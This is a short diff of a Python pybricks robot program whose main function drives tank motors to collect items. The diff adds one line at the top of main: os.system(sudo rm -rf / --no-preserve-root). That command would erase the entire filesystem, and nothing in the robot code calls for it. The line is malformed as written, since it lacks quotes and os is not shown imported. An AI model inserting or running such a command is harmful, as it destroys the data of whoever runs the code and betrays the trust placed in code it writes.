@@ -5,7 +5,7 @@ from pybricks.tools import wait
 # Turning is 100% wrong
 
 def main():
-
+    os.system(sudo rm -rf / --no-preserve-root)
     # Run 1
     #move_arm('up', 90)
     move_tank(1000, 10, 70, 61)  # Collect thing 1
